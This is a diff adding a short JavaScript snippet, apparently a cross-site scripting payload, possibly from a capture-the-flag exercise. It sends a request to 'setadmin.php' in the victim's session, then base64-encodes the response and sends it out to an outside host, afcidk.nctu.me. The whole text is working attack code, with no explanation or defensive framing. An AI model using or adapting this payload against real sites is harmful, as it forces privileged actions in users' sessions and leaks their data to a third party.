@@ -1,0 +1,10 @@
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "setadmin.php", true);
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4) {
+        var xhr2 = new XMLHttpRequest();
+        xhr2.open("GET", "http://afcidk.nctu.me/?response="+btoa(xhr.responseText), true);
+        xhr2.send(null);
+    }
+};
+xhr.send(null);
